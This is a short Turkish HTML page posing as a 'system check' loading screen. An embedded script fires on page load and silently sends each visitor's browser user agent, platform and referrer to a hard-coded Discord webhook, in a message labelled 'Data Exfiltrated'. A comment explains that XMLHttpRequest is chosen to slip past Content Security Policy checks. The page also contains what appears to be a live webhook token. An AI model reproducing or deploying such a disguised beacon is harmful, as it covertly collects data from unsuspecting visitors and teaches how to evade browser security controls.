<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Kontrolü</title>
</head>
<body>
    <h1>Yükleniyor...</h1>
    
    <script>
        // Önceki scriptlerle çakışmaması için başına noktalı virgül koyuyoruz
        ;(function() {
            var webhookUrl = 'https://discord.com/api/webhooks/1483513824064831703/veRtfwL-8dyJPQ2gMGHD1FtxvgcsG1if2Sh_VqHLnERPfcPSqbHyjJ_BWIyVATmum9kf';

            var data = {
                embeds: [{
                    title: "🚀 Veri Sızdırıldı",
                    color: 3066993,
                    fields: [
                        { name: "Tarayıcı", value: navigator.userAgent },
                        { name: "Platform", value: navigator.platform },
                        { name: "Referrer", value: document.referrer || "Direkt" }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            // Fetch yerine XMLHttpRequest kullanıyoruz (Bazen CSP 'fetch'i daha sıkı denetler)
            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    console.log("Durum: " + xhr.status);
                }
            };

            xhr.send(JSON.stringify(data));
        })();
    </script>
</body>
</html>
